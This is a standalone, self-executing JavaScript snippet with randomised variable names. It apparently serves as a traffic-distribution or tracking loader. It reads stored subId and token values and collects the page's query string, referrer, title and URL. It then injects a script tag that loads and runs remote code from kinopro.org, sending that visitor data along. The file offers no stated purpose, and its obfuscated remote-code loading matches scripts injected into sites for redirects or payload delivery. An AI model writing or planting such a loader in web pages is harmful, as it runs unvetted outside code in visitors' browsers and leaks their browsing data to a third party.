    (function() {
    var name = '_nFdJtXD8smcLYG6P';
    if (!window._nFdJtXD8smcLYG6P) {
        window._nFdJtXD8smcLYG6P = {
            unique: true,
            ttl: 86400,
            R_PATH: 'https://kinopro.org/msQ9k5Vg',
            P_PATH: 'https://kinopro.org/19d4412/postback',
        };
    }
    const _rqJR52V8wFZ8BNLs = localStorage.getItem('config');
    if (typeof _rqJR52V8wFZ8BNLs !== 'undefined' && _rqJR52V8wFZ8BNLs !== null) {
        var _rVqtgjGZMk2wHZV3 = JSON.parse(_rqJR52V8wFZ8BNLs);
        var _mmSjPqSRsy1FbcT3 = Math.round(+new Date()/1000);
        if (_rVqtgjGZMk2wHZV3.created_at + window._nFdJtXD8smcLYG6P.ttl < _mmSjPqSRsy1FbcT3) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _Z29DPXmLVFF8KZ6f = localStorage.getItem('subId');
    var _DLGkZ7sxxf7Zh38m = localStorage.getItem('token');
    var _Cv6StwtwCkRyBPjH = '?return=js.client';
        _Cv6StwtwCkRyBPjH += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Cv6StwtwCkRyBPjH += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Cv6StwtwCkRyBPjH += '&default_keyword=' + encodeURIComponent(document.title);
        _Cv6StwtwCkRyBPjH += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Cv6StwtwCkRyBPjH += '&name=' + encodeURIComponent(name);
    if (typeof _Z29DPXmLVFF8KZ6f !== 'undefined' && _Z29DPXmLVFF8KZ6f && window._nFdJtXD8smcLYG6P.unique) {
        _Cv6StwtwCkRyBPjH += '&sub_id=' + encodeURIComponent(_Z29DPXmLVFF8KZ6f);
    }
    if (typeof _DLGkZ7sxxf7Zh38m !== 'undefined' && _DLGkZ7sxxf7Zh38m && window._nFdJtXD8smcLYG6P.unique) {
        _Cv6StwtwCkRyBPjH += '&token=' + encodeURIComponent(_DLGkZ7sxxf7Zh38m);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._nFdJtXD8smcLYG6P.R_PATH + _Cv6StwtwCkRyBPjH;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
